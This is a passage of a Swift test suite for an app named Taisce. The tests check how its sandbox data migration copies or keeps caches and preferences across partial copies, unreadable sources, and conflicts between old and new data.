        let (d, name) = try suite()
        defer { d.removePersistentDomain(forName: name) }
        chmod(container.path, 0)
        let r1 = run(container, dest, d, name)
        chmod(container.path, 0o755)
        #expect(r1.sourceUnreadable && !r1.complete)
        #expect(SandboxMigration.blockingReason(r1) == "Quit and open Taisce from Finder to finish moving your data.")
        // what the app did before the fix: open its cache anyway
        try await { let c = try Cache(path: dest.appendingPathComponent(Self.cacheName).path); _ = try await c.lastSeq() }()
        let r2 = run(container, dest, d, name)
        #expect(r2.complete)
        #expect(r2.replaced == ["Application Support/\(Self.cacheName)"])
        #expect(r2.copied.contains("Application Support/\(Self.cacheName)"))
        #expect(SandboxMigration.blockingReason(r2) == nil)
        let cache = try Cache(path: dest.appendingPathComponent(Self.cacheName).path)
        #expect(try await cache.pendingOutbox().count == 2)
        // the empty one is set aside, not deleted
        let aside = try FileManager.default.contentsOfDirectory(atPath: dest.path).filter { $0.hasPrefix(".replaced-") }
        #expect(aside.count == 1)
    }

    final class FailingMoves: FileManager, @unchecked Sendable {
        /// a move onto a file with this suffix throws
        let suffix: String
        init(failing suffix: String) {
            self.suffix = suffix
            super.init()
        }

        override func moveItem(at srcURL: URL, to dstURL: URL) throws {
            if dstURL.lastPathComponent.hasSuffix(suffix) { throw CocoaError(.fileWriteUnknown) }
            try super.moveItem(at: srcURL, to: dstURL)
        }
    }

    /// B1, partial copy: the WAL moved, the database failed: nothing is
    /// left for the app to open beside a foreign WAL, the pass is
    /// incomplete, and the next one copies it whole.
    @Test func aPartialCopyLeavesNothingAndIsRetried() async throws {
        let container = try await fakeContainer(prefs: [:])
        let walInContainer = container.appendingPathComponent("Library/Application Support/\(Self.cacheName)-wal")
        #expect(FileManager.default.fileExists(atPath: walInContainer.path), "the fixture keeps its writes in the WAL")
        let dest = try tempDir("partial")
        let (d, name) = try suite()
        defer { d.removePersistentDomain(forName: name) }
        // a stray SHM from some earlier failure
        try Data("stale".utf8).write(to: dest.appendingPathComponent(Self.cacheName + "-shm"))
        let r1 = run(container, dest, d, name, fm: FailingMoves(failing: ".sqlite"))
        #expect(!r1.complete && r1.errors.count == 1)
        #expect(SandboxMigration.blockingReason(r1) != nil)
        let left = try FileManager.default.contentsOfDirectory(atPath: dest.path).filter { $0.hasPrefix("cache-") }
        #expect(left.isEmpty, "\(left)")
        #expect(d.string(forKey: SandboxMigration.doneKey) == nil)
        let r2 = run(container, dest, d, name)
        #expect(r2.complete && r2.copied.count == 3)
        #expect(try await Cache(path: dest.appendingPathComponent(Self.cacheName).path).pendingOutbox().count == 2)
    }

    /// A destination cache with data (an owner) and a container cache with
    /// unsent writes: both kept, an error, never marked done.
    @Test func neverMarkedDoneWhileContainerWritesWereNotCopied() async throws {
        let container = try await fakeContainer(prefs: [:])
        let dest = try tempDir("conflict")
        let (d, name) = try suite()
        defer { d.removePersistentDomain(forName: name) }
        try await { let c = try Cache(path: dest.appendingPathComponent(Self.cacheName).path); try await c.setOwner("p-someone") }()
        let r = run(container, dest, d, name)
        #expect(!r.complete && r.copied.isEmpty && r.replaced.isEmpty)
        #expect(r.errors.first?.contains("2 unsent changes") == true)
        #expect(d.string(forKey: SandboxMigration.doneKey) == nil)
        #expect(try await Cache(path: dest.appendingPathComponent(Self.cacheName).path).owner() == "p-someone")
        // a file that isn't a cache at all counts as data too
        let dest2 = try tempDir("conflict2")
        try Data("mine".utf8).write(to: dest2.appendingPathComponent(Self.cacheName))
        let r2 = run(container, dest2, d, name)
        #expect(!r2.complete)
        #expect(try Data(contentsOf: dest2.appendingPathComponent(Self.cacheName)) == Data("mine".utf8))
    }

    /// R2: a destination byte-identical to what's staged is ours (a crash
    /// before the record, or a 38ccf95-era copy), so no dead end.
    @Test func anIdenticalDestinationIsOurs() async throws {
        let container = try await fakeContainer(prefs: [:])
        let dest = try tempDir("identical")
        let (d, name) = try suite()
        defer { d.removePersistentDomain(forName: name) }
        let r1 = run(container, dest, d, name)
        #expect(r1.complete)
        // forget the record, and the marker, as an older build would have
        d.removeObject(forKey: SandboxMigration.createdKey)
        d.removeObject(forKey: SandboxMigration.doneKey)
        // the WAL/SHM differ once SQLite has touched them: the db file decides
        let r2 = run(container, dest, d, name)
        #expect(r2.complete && r2.kept == ["Application Support/\(Self.cacheName)"], "\(r2)")
        #expect((d.array(forKey: SandboxMigration.createdKey) as? [String]) == [Self.cacheName])
    }

    /// R2: the "both have data" state has two ways out.
    @Test func aConflictCanKeepTheCopyHereOrUseTheOldOne() async throws {
        for keepHere in [true, false] {
            let container = try await fakeContainer(prefs: [:])
            let dest = try tempDir("resolve")
            let (d, name) = try suite()
            defer { d.removePersistentDomain(forName: name) }
            try await { let c = try Cache(path: dest.appendingPathComponent(Self.cacheName).path); try await c.setOwner("p-here") }()
            let r = run(container, dest, d, name)
            let conflict = try #require(r.conflicts.first)
            #expect(!r.complete && conflict == .init(name: Self.cacheName, unsent: 2))
            if keepHere {
                let log = SandboxMigration.keepDestination(conflict, defaults: d, domain: name)
                #expect(log.first?.contains("2 unsent changes") == true)
                let again = run(container, dest, d, name)
                #expect(again.complete && again.kept == ["Application Support/\(Self.cacheName)"])
                #expect(try await Cache(path: dest.appendingPathComponent(Self.cacheName).path).owner() == "p-here")
                #expect(FileManager.default.fileExists(atPath: container.appendingPathComponent("Library/Application Support/\(Self.cacheName)").path), "the old one stays")
            } else {
                try SandboxMigration.useContainerCopy(conflict, supportDestination: dest)
                let again = run(container, dest, d, name)
                #expect(again.complete && again.copied.contains("Application Support/\(Self.cacheName)"))
                #expect(try await Cache(path: dest.appendingPathComponent(Self.cacheName).path).pendingOutbox().count == 2)
                let aside = try FileManager.default.contentsOfDirectory(atPath: dest.path).filter { $0.hasPrefix(".replaced-") }
                #expect(aside.count == 1, "the copy that was here is set aside, not deleted")
            }
        }
    }

    /// The same, but the container's cache has nothing unsent: keep the
    /// destination's and finish.
    @Test func aDestinationCacheIsKeptWhenTheContainerHasNothingUnsent() async throws {
        let data = try tempDir("container0").appendingPathComponent("Data", isDirectory: true)
        let support = data.appendingPathComponent("Library/Application Support", isDirectory: true)
        try FileManager.default.createDirectory(at: support, withIntermediateDirectories: true)
        try await { let c = try Cache(path: support.appendingPathComponent(Self.cacheName).path); try await c.setLastSeq(9) }()
        let dest = try tempDir("keep")
        let (d, name) = try suite()
        defer { d.removePersistentDomain(forName: name) }
        try await { let c = try Cache(path: dest.appendingPathComponent(Self.cacheName).path); try await c.setOwner("p-tom") }()
        let r = run(data, dest, d, name)
        #expect(r.complete && r.kept == ["Application Support/\(Self.cacheName)"])
        #expect(try await Cache(path: dest.appendingPathComponent(Self.cacheName).path).owner() == "p-tom")
    }

    /// A pass that copied the cache but couldn't read the preferences: the
    /// next pass knows the cache is its own (it holds the outbox now) and
    /// finishes.
    @Test func aCacheThisMigrationCopiedIsItsOwnOnTheNextPass() async throws {
        let container = try await fakeContainer(prefs: ["serverURL": "https://taisce.null.ie"])
        let plist = container.appendingPathComponent("Library/Preferences/ie.null.taisce.plist")
        let dest = try tempDir("ours")
        let (d, name) = try suite()
        defer { d.removePersistentDomain(forName: name) }
        chmod(plist.path, 0)
        let r1 = run(container, dest, d, name)
        chmod(plist.path, 0o644)
        #expect(!r1.complete && r1.copied.contains("Application Support/\(Self.cacheName)"))
        #expect((d.array(forKey: SandboxMigration.createdKey) as? [String]) == [Self.cacheName])
        let r2 = run(container, dest, d, name)
        #expect(r2.complete && r2.kept == ["Application Support/\(Self.cacheName)"] && r2.errors.isEmpty)
        #expect(r2.importedKeys == ["serverURL"])
        #expect(try await Cache(path: dest.appendingPathComponent(Self.cacheName).path).pendingOutbox().count == 2)
    }

    @Test func noContainerIsDoneAndAnUnreadableOneIsRetried() throws {
        let suite = "taisce.tests.migration.\(UUID().uuidString)"
        let defaults = try #require(UserDefaults(suiteName: suite))
        defer { defaults.removePersistentDomain(forName: suite) }
        let missing = FileManager.default.temporaryDirectory.appendingPathComponent("nope-\(UUID().uuidString)/Data")
        let dest = try tempDir("support3")
        let r = SandboxMigration.run(containerData: missing, supportDestination: dest, bundleID: "ie.null.taisce", defaults: defaults, domain: suite)
        #expect(r.noContainer && r.complete)

        let suite2 = "taisce.tests.migration.\(UUID().uuidString)"
        let d2 = try #require(UserDefaults(suiteName: suite2))
        defer { d2.removePersistentDomain(forName: suite2) }
        let locked = try tempDir("locked").appendingPathComponent("Data", isDirectory: true)
        try FileManager.default.createDirectory(at: locked.appendingPathComponent("Library"), withIntermediateDirectories: true)
        try FileManager.default.setAttributes([.posixPermissions: 0o000], ofItemAtPath: locked.path)
        defer { try? FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: locked.path) }
        let u = SandboxMigration.run(containerData: locked, supportDestination: dest, bundleID: "ie.null.taisce", defaults: d2, domain: suite2)
        #expect(u.sourceUnreadable && !u.complete)
        #expect(d2.string(forKey: SandboxMigration.doneKey) == nil, "retried next launch")
        #expect(SandboxMigration.logLines(u).first?.contains("incomplete") == true)
    }
}
